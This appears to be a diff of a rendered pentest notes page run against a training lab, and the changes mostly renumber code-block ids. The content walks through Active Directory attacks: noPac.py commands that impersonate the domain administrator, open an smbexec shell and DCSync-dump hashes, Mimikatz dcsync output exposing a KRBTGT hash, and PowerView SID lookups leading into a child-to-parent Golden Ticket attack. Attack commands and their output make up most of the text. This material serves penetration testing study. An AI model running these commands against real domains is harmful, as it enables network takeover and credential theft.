-<span class="normal"><a href="#__codelineno-72-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1"></a><span class="c1"># We could then use the cache file to perform a pass-the-ticket and perform further attacks such as DCSync.  Using noPac to DCSync the Built-in Administrator Account</span>
-</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2"></a>sudo<span class="w"> </span>python3<span class="w"> </span>noPac.py<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>:<span class="nv">$password</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$domainControllerIP</span><span class="w"> </span>-dc-host<span class="w"> </span><span class="nv">$hostname</span><span class="w"> </span>--impersonate<span class="w"> </span><span class="nv">$userAdmin</span><span class="w"> </span>-use-ldap<span class="w"> </span>-dump<span class="w"> </span>-just-dc-user<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$userAdmin</span>
-</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3"></a><span class="c1"># Example:</span>
-</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4"></a><span class="c1"># sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</span>
-</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5"></a>
-</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6"></a><span class="c1"># We can also dump all</span>
-</span><span id="__span-72-7"><a id="__codelineno-72-7" name="__codelineno-72-7"></a>sudo<span class="w"> </span>python3<span class="w"> </span>noPac.py<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>:<span class="nv">$password</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$domainControllerIP</span><span class="w"> </span>-dc-host<span class="w"> </span><span class="nv">$hostname</span><span class="w"> </span>--impersonate<span class="w"> </span><span class="nv">$userAdmin</span><span class="w"> </span>-use-ldap<span class="w"> </span>-dump<span class="w"> </span>-just-dc
-</span><span id="__span-72-8"><a id="__codelineno-72-8" name="__codelineno-72-8"></a><span class="c1"># Example:</span>
-</span><span id="__span-72-9"><a id="__codelineno-72-9" name="__codelineno-72-9"></a><span class="c1"># sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc</span>
+<span class="normal"><a href="#__codelineno-72-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1"></a><span class="c1"># Running NoPac &amp; Getting a semi-interactive shell session  using smbexec.py -https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py. This could be &quot;noisy&quot; or may be blocked by AV or EDR.</span>
+</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2"></a>sudo<span class="w"> </span>python3<span class="w"> </span>noPac.py<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>:<span class="nv">$password</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$domainControllerIP</span><span class="w"> </span>-dc-host<span class="w"> </span><span class="nv">$hostname</span><span class="w"> </span>-shell<span class="w"> </span>--impersonate<span class="w"> </span><span class="nv">$userAdmin</span><span class="w"> </span>-use-ldap
+</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3"></a><span class="c1"># Example: </span>
+</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4"></a><span class="c1"># sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Important: It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run (We can use <code>ls</code> to confirm).</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-73-1">1</a></span>
+<span class="normal"><a href="#__codelineno-73-2">2</a></span>
+<span class="normal"><a href="#__codelineno-73-3">3</a></span>
+<span class="normal"><a href="#__codelineno-73-4">4</a></span>
+<span class="normal"><a href="#__codelineno-73-5">5</a></span>
+<span class="normal"><a href="#__codelineno-73-6">6</a></span>
+<span class="normal"><a href="#__codelineno-73-7">7</a></span>
+<span class="normal"><a href="#__codelineno-73-8">8</a></span>
+<span class="normal"><a href="#__codelineno-73-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1"></a><span class="c1"># We could then use the cache file to perform a pass-the-ticket and perform further attacks such as DCSync.  Using noPac to DCSync the Built-in Administrator Account</span>
+</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2"></a>sudo<span class="w"> </span>python3<span class="w"> </span>noPac.py<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>:<span class="nv">$password</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$domainControllerIP</span><span class="w"> </span>-dc-host<span class="w"> </span><span class="nv">$hostname</span><span class="w"> </span>--impersonate<span class="w"> </span><span class="nv">$userAdmin</span><span class="w"> </span>-use-ldap<span class="w"> </span>-dump<span class="w"> </span>-just-dc-user<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$userAdmin</span>
+</span><span id="__span-73-3"><a id="__codelineno-73-3" name="__codelineno-73-3"></a><span class="c1"># Example:</span>
+</span><span id="__span-73-4"><a id="__codelineno-73-4" name="__codelineno-73-4"></a><span class="c1"># sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</span>
+</span><span id="__span-73-5"><a id="__codelineno-73-5" name="__codelineno-73-5"></a>
+</span><span id="__span-73-6"><a id="__codelineno-73-6" name="__codelineno-73-6"></a><span class="c1"># We can also dump all</span>
+</span><span id="__span-73-7"><a id="__codelineno-73-7" name="__codelineno-73-7"></a>sudo<span class="w"> </span>python3<span class="w"> </span>noPac.py<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$user</span>:<span class="nv">$password</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$domainControllerIP</span><span class="w"> </span>-dc-host<span class="w"> </span><span class="nv">$hostname</span><span class="w"> </span>--impersonate<span class="w"> </span><span class="nv">$userAdmin</span><span class="w"> </span>-use-ldap<span class="w"> </span>-dump<span class="w"> </span>-just-dc
+</span><span id="__span-73-8"><a id="__codelineno-73-8" name="__codelineno-73-8"></a><span class="c1"># Example:</span>
+</span><span id="__span-73-9"><a id="__codelineno-73-9" name="__codelineno-73-9"></a><span class="c1"># sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc</span>
 </span></code></pre></div></td></tr></table></div>
 <h3 id="mitigations">Mitigations</h3>
 <p><strong>If opsec or being "quiet" is a consideration during an assessment, we would most likely want to avoid a tool like smbexec.py.</strong></p>
@@ -18810,76 +18865,76 @@ This repository provides a few techniques and scripts regarding the impact of Mi
 <h5 id="step-1-getting-the-krbtgt-hash-from-the-child-domain">Step 1: getting the KRBTGT hash from the child domain</h5>
 <p>First, we need to obtain the NT hash for the <a href="https://adsecurity.org/?p=483">KRBTGT</a> account, which is a service account for the Key Distribution Center (KDC) in Active Directory.</p>
 <p>Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-73-1">1</a></span>
-<span class="normal"><a href="#__codelineno-73-2">2</a></span>
-<span class="normal"><a href="#__codelineno-73-3">3</a></span>
-<span class="normal"><a href="#__codelineno-73-4">4</a></span>
-<span class="normal"><a href="#__codelineno-73-5">5</a></span>
-<span class="normal"><a href="#__codelineno-73-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1"></a># Go to mimikatz.exe file in the explorer and execute as admin
-</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2"></a>
-</span><span id="__span-73-3"><a id="__codelineno-73-3" name="__codelineno-73-3"></a>lsadump::dcsync /user:$domain\$user
-</span><span id="__span-73-4"><a id="__codelineno-73-4" name="__codelineno-73-4"></a># Example:
-</span><span id="__span-73-5"><a id="__codelineno-73-5" name="__codelineno-73-5"></a># .\mimikatz.exe
-</span><span id="__span-73-6"><a id="__codelineno-73-6" name="__codelineno-73-6"></a># lsadump::dcsync /user:LOGISTICS\krbtgt
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-74-1">1</a></span>
+<span class="normal"><a href="#__codelineno-74-2">2</a></span>
+<span class="normal"><a href="#__codelineno-74-3">3</a></span>
+<span class="normal"><a href="#__codelineno-74-4">4</a></span>
+<span class="normal"><a href="#__codelineno-74-5">5</a></span>
+<span class="normal"><a href="#__codelineno-74-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1"></a># Go to mimikatz.exe file in the explorer and execute as admin
+</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2"></a>
+</span><span id="__span-74-3"><a id="__codelineno-74-3" name="__codelineno-74-3"></a>lsadump::dcsync /user:$domain\$user
+</span><span id="__span-74-4"><a id="__codelineno-74-4" name="__codelineno-74-4"></a># Example:
+</span><span id="__span-74-5"><a id="__codelineno-74-5" name="__codelineno-74-5"></a># .\mimikatz.exe
+</span><span id="__span-74-6"><a id="__codelineno-74-6" name="__codelineno-74-6"></a># lsadump::dcsync /user:LOGISTICS\krbtgt
 </span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-74-1"> 1</a></span>
-<span class="normal"><a href="#__codelineno-74-2"> 2</a></span>
-<span class="normal"><a href="#__codelineno-74-3"> 3</a></span>
-<span class="normal"><a href="#__codelineno-74-4"> 4</a></span>
-<span class="normal"><a href="#__codelineno-74-5"> 5</a></span>
-<span class="normal"><a href="#__codelineno-74-6"> 6</a></span>
-<span class="normal"><a href="#__codelineno-74-7"> 7</a></span>
-<span class="normal"><a href="#__codelineno-74-8"> 8</a></span>
-<span class="normal"><a href="#__codelineno-74-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-74-10">10</a></span>
-<span class="normal"><a href="#__codelineno-74-11">11</a></span>
-<span class="normal"><a href="#__codelineno-74-12">12</a></span>
-<span class="normal"><a href="#__codelineno-74-13">13</a></span>
-<span class="normal"><a href="#__codelineno-74-14">14</a></span>
-<span class="normal"><a href="#__codelineno-74-15">15</a></span>
-<span class="normal"><a href="#__codelineno-74-16">16</a></span>
-<span class="normal"><a href="#__codelineno-74-17">17</a></span>
-<span class="normal"><a href="#__codelineno-74-18">18</a></span>
-<span class="normal"><a href="#__codelineno-74-19">19</a></span>
-<span class="normal"><a href="#__codelineno-74-20">20</a></span>
-<span class="normal"><a href="#__codelineno-74-21">21</a></span>
-<span class="normal"><a href="#__codelineno-74-22">22</a></span>
-<span class="normal"><a href="#__codelineno-74-23">23</a></span>
-<span class="normal"><a href="#__codelineno-74-24">24</a></span>
-<span class="normal"><a href="#__codelineno-74-25">25</a></span>
-<span class="normal"><a href="#__codelineno-74-26">26</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1"></a>[DC] &#39;LOGISTICS.INLANEFREIGHT.LOCAL&#39; will be the domain
-</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2"></a>[DC] &#39;ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL&#39; will be the DC server
-</span><span id="__span-74-3"><a id="__codelineno-74-3" name="__codelineno-74-3"></a>[DC] &#39;LOGISTICS\krbtgt&#39; will be the user account
-</span><span id="__span-74-4"><a id="__codelineno-74-4" name="__codelineno-74-4"></a>[rpc] Service  : ldap
-</span><span id="__span-74-5"><a id="__codelineno-74-5" name="__codelineno-74-5"></a>[rpc] AuthnSvc : GSS_NEGOTIATE (9)
-</span><span id="__span-74-6"><a id="__codelineno-74-6" name="__codelineno-74-6"></a>
-</span><span id="__span-74-7"><a id="__codelineno-74-7" name="__codelineno-74-7"></a>Object RDN           : krbtgt
-</span><span id="__span-74-8"><a id="__codelineno-74-8" name="__codelineno-74-8"></a>
-</span><span id="__span-74-9"><a id="__codelineno-74-9" name="__codelineno-74-9"></a>** SAM ACCOUNT **
-</span><span id="__span-74-10"><a id="__codelineno-74-10" name="__codelineno-74-10"></a>
-</span><span id="__span-74-11"><a id="__codelineno-74-11" name="__codelineno-74-11"></a>SAM Username         : krbtgt
-</span><span id="__span-74-12"><a id="__codelineno-74-12" name="__codelineno-74-12"></a>Account Type         : 30000000 ( USER_OBJECT )
-</span><span id="__span-74-13"><a id="__codelineno-74-13" name="__codelineno-74-13"></a>User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
-</span><span id="__span-74-14"><a id="__codelineno-74-14" name="__codelineno-74-14"></a>Account expiration   :
-</span><span id="__span-74-15"><a id="__codelineno-74-15" name="__codelineno-74-15"></a>Password last change : 11/1/2021 10:21:33 AM
-</span><span id="__span-74-16"><a id="__codelineno-74-16" name="__codelineno-74-16"></a>Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
-</span><span id="__span-74-17"><a id="__codelineno-74-17" name="__codelineno-74-17"></a>Object Relative ID   : 502
-</span><span id="__span-74-18"><a id="__codelineno-74-18" name="__codelineno-74-18"></a>
-</span><span id="__span-74-19"><a id="__codelineno-74-19" name="__codelineno-74-19"></a>Credentials:
-</span><span id="__span-74-20"><a id="__codelineno-74-20" name="__codelineno-74-20"></a>  Hash NTLM: 9d765b482771505cbe97411065964d5f
-</span><span id="__span-74-21"><a id="__codelineno-74-21" name="__codelineno-74-21"></a>    ntlm- 0: 9d765b482771505cbe97411065964d5f
-</span><span id="__span-74-22"><a id="__codelineno-74-22" name="__codelineno-74-22"></a>    lm  - 0: 69df324191d4a80f0ed100c10f20561e
-</span><span id="__span-74-23"><a id="__codelineno-74-23" name="__codelineno-74-23"></a>
-</span><span id="__span-74-24"><a id="__codelineno-74-24" name="__codelineno-74-24"></a>Supplemental Credentials:
-</span><span id="__span-74-25"><a id="__codelineno-74-25" name="__codelineno-74-25"></a>
-</span><span id="__span-74-26"><a id="__codelineno-74-26" name="__codelineno-74-26"></a>SNIP
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-75-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-75-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-75-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-75-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-75-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-75-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-75-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-75-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-75-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-75-10">10</a></span>
+<span class="normal"><a href="#__codelineno-75-11">11</a></span>
+<span class="normal"><a href="#__codelineno-75-12">12</a></span>
+<span class="normal"><a href="#__codelineno-75-13">13</a></span>
+<span class="normal"><a href="#__codelineno-75-14">14</a></span>
+<span class="normal"><a href="#__codelineno-75-15">15</a></span>
+<span class="normal"><a href="#__codelineno-75-16">16</a></span>
+<span class="normal"><a href="#__codelineno-75-17">17</a></span>
+<span class="normal"><a href="#__codelineno-75-18">18</a></span>
+<span class="normal"><a href="#__codelineno-75-19">19</a></span>
+<span class="normal"><a href="#__codelineno-75-20">20</a></span>
+<span class="normal"><a href="#__codelineno-75-21">21</a></span>
+<span class="normal"><a href="#__codelineno-75-22">22</a></span>
+<span class="normal"><a href="#__codelineno-75-23">23</a></span>
+<span class="normal"><a href="#__codelineno-75-24">24</a></span>
+<span class="normal"><a href="#__codelineno-75-25">25</a></span>
+<span class="normal"><a href="#__codelineno-75-26">26</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1"></a>[DC] &#39;LOGISTICS.INLANEFREIGHT.LOCAL&#39; will be the domain
+</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2"></a>[DC] &#39;ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL&#39; will be the DC server
+</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3"></a>[DC] &#39;LOGISTICS\krbtgt&#39; will be the user account
+</span><span id="__span-75-4"><a id="__codelineno-75-4" name="__codelineno-75-4"></a>[rpc] Service  : ldap
+</span><span id="__span-75-5"><a id="__codelineno-75-5" name="__codelineno-75-5"></a>[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+</span><span id="__span-75-6"><a id="__codelineno-75-6" name="__codelineno-75-6"></a>
+</span><span id="__span-75-7"><a id="__codelineno-75-7" name="__codelineno-75-7"></a>Object RDN           : krbtgt
+</span><span id="__span-75-8"><a id="__codelineno-75-8" name="__codelineno-75-8"></a>
+</span><span id="__span-75-9"><a id="__codelineno-75-9" name="__codelineno-75-9"></a>** SAM ACCOUNT **
+</span><span id="__span-75-10"><a id="__codelineno-75-10" name="__codelineno-75-10"></a>
+</span><span id="__span-75-11"><a id="__codelineno-75-11" name="__codelineno-75-11"></a>SAM Username         : krbtgt
+</span><span id="__span-75-12"><a id="__codelineno-75-12" name="__codelineno-75-12"></a>Account Type         : 30000000 ( USER_OBJECT )
+</span><span id="__span-75-13"><a id="__codelineno-75-13" name="__codelineno-75-13"></a>User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+</span><span id="__span-75-14"><a id="__codelineno-75-14" name="__codelineno-75-14"></a>Account expiration   :
+</span><span id="__span-75-15"><a id="__codelineno-75-15" name="__codelineno-75-15"></a>Password last change : 11/1/2021 10:21:33 AM
+</span><span id="__span-75-16"><a id="__codelineno-75-16" name="__codelineno-75-16"></a>Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
+</span><span id="__span-75-17"><a id="__codelineno-75-17" name="__codelineno-75-17"></a>Object Relative ID   : 502
+</span><span id="__span-75-18"><a id="__codelineno-75-18" name="__codelineno-75-18"></a>
+</span><span id="__span-75-19"><a id="__codelineno-75-19" name="__codelineno-75-19"></a>Credentials:
+</span><span id="__span-75-20"><a id="__codelineno-75-20" name="__codelineno-75-20"></a>  Hash NTLM: 9d765b482771505cbe97411065964d5f
+</span><span id="__span-75-21"><a id="__codelineno-75-21" name="__codelineno-75-21"></a>    ntlm- 0: 9d765b482771505cbe97411065964d5f
+</span><span id="__span-75-22"><a id="__codelineno-75-22" name="__codelineno-75-22"></a>    lm  - 0: 69df324191d4a80f0ed100c10f20561e
+</span><span id="__span-75-23"><a id="__codelineno-75-23" name="__codelineno-75-23"></a>
+</span><span id="__span-75-24"><a id="__codelineno-75-24" name="__codelineno-75-24"></a>Supplemental Credentials:
+</span><span id="__span-75-25"><a id="__codelineno-75-25" name="__codelineno-75-25"></a>
+</span><span id="__span-75-26"><a id="__codelineno-75-26" name="__codelineno-75-26"></a>SNIP
 </span></code></pre></div></td></tr></table></div>
 <p>KRBTGT hash : <code>9d765b482771505cbe97411065964d5f</code>.</p>
 <h5 id="step-2-getting-the-sid-for-the-child-domain">Step 2: getting the SID for the child domain</h5>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-75-1">1</a></span>
-<span class="normal"><a href="#__codelineno-75-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
-</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2"></a><span class="nb">Get-DomainSID</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-76-1">1</a></span>
+<span class="normal"><a href="#__codelineno-76-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2"></a><span class="nb">Get-DomainSID</span>
 </span></code></pre></div></td></tr></table></div>
 <p>However it was also visible in the Mimikatz output above.</p>
 <h5 id="step-3-getting-the-name-of-a-target-user-in-the-child-domain-does-not-need-to-exist">Step 3: getting the name of a target user in the child domain (does not need to exist!)</h5>
@@ -18888,25 +18943,25 @@ This repository provides a few techniques and scripts regarding the impact of Mi
 <p>It was also visible in the Mimikatz output above: <code>LOGISTICS.INLANEFREIGHT.LOCAL</code>.</p>
 <h5 id="step-5-getting-the-sid-of-the-enterprise-admins-group-of-the-root-domain">Step 5: getting the SID of the Enterprise Admins group of the root domain</h5>
 <p>Next, we can use <code>Get-DomainGroup</code> from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. </p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-76-1">1</a></span>
-<span class="normal"><a href="#__codelineno-76-2">2</a></span>
-<span class="normal"><a href="#__codelineno-76-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1"></a><span class="nb">Get-DomainGroup</span> <span class="n">-Domain</span> <span class="nv">$domain</span> <span class="n">-Identity</span> <span class="s2">&quot;$GroupName&quot;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">distinguishedname</span><span class="p">,</span><span class="n">objectsid</span>
-</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2"></a><span class="c"># Example: </span>
-</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3"></a><span class="c"># Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity &quot;Enterprise Admins&quot; | select distinguishedname,objectsid</span>
-</span></code></pre></div></td></tr></table></div>
-<p>We could also do this with the <a href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps">Get-ADGroup</a> cmdlet:</p>
 <div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-77-1">1</a></span>
 <span class="normal"><a href="#__codelineno-77-2">2</a></span>
-<span class="normal"><a href="#__codelineno-77-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1"></a><span class="nb">Get-ADGroup</span> <span class="n">-Identity</span> <span class="s2">&quot;$GroupName&quot;</span> <span class="n">-Server</span> <span class="s2">&quot;$DomainServer&quot;</span><span class="p">`</span>
+<span class="normal"><a href="#__codelineno-77-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1"></a><span class="nb">Get-DomainGroup</span> <span class="n">-Domain</span> <span class="nv">$domain</span> <span class="n">-Identity</span> <span class="s2">&quot;$GroupName&quot;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">distinguishedname</span><span class="p">,</span><span class="n">objectsid</span>
 </span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2"></a><span class="c"># Example: </span>
-</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3"></a><span class="c"># Get-ADGroup -Identity &quot;Enterprise Admins&quot; -Server &quot;INLANEFREIGHT.LOCAL&quot;</span>
+</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3"></a><span class="c"># Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity &quot;Enterprise Admins&quot; | select distinguishedname,objectsid</span>
+</span></code></pre></div></td></tr></table></div>
+<p>We could also do this with the <a href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps">Get-ADGroup</a> cmdlet:</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-78-1">1</a></span>
+<span class="normal"><a href="#__codelineno-78-2">2</a></span>
+<span class="normal"><a href="#__codelineno-78-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1"></a><span class="nb">Get-ADGroup</span> <span class="n">-Identity</span> <span class="s2">&quot;$GroupName&quot;</span> <span class="n">-Server</span> <span class="s2">&quot;$DomainServer&quot;</span><span class="p">`</span>
+</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2"></a><span class="c"># Example: </span>
+</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3"></a><span class="c"># Get-ADGroup -Identity &quot;Enterprise Admins&quot; -Server &quot;INLANEFREIGHT.LOCAL&quot;</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-78-1">1</a></span>
-<span class="normal"><a href="#__codelineno-78-2">2</a></span>
-<span class="normal"><a href="#__codelineno-78-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1"></a>distinguishedname                                       objectsid
-</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2"></a>-----------------                                       ---------
-</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3"></a>CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-79-1">1</a></span>
+<span class="normal"><a href="#__codelineno-79-2">2</a></span>
+<span class="normal"><a href="#__codelineno-79-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1"></a>distinguishedname                                       objectsid
+</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2"></a>-----------------                                       ---------
+</span><span id="__span-79-3"><a id="__codelineno-79-3" name="__codelineno-79-3"></a>CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
 </span></code></pre></div></td></tr></table></div>
 <h5 id="step-6-the-attack">Step 6: The attack</h5>
 <ul>
@@ -18917,124 +18972,124 @@ This repository provides a few techniques and scripts regarding the impact of Mi
 <li>The SID of the Enterprise Admins group of the root domain: <code>S-1-5-21-3842939050-3880317879-2865463114-519</code></li>
 </ul>
 <p>Before the attack, we can confirm no access to the file system of the DC in the parent domain:</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-79-1">1</a></span>
-<span class="normal"><a href="#__codelineno-79-2">2</a></span>
-<span class="normal"><a href="#__codelineno-79-3">3</a></span>
-<span class="normal"><a href="#__codelineno-79-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1"></a><span class="c"># List C: in the parent domain:</span>
-</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2"></a><span class="nb">ls </span><span class="p">\\</span><span class="nv">$parenhostname</span><span class="p">.</span><span class="nv">$domain</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
-</span><span id="__span-79-3"><a id="__codelineno-79-3" name="__codelineno-79-3"></a><span class="c"># Example: </span>
-</span><span id="__span-79-4"><a id="__codelineno-79-4" name="__codelineno-79-4"></a><span class="c"># ls \\academy-ea-dc01.inlanefreight.local\c$</span>
-</span></code></pre></div></td></tr></table></div>
-<p>Using Mimikatz and the data listed above, we can create a Golden Ticket to access all resources within the parent domain.</p>
 <div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-80-1">1</a></span>
 <span class="normal"><a href="#__codelineno-80-2">2</a></span>
 <span class="normal"><a href="#__codelineno-80-3">3</a></span>
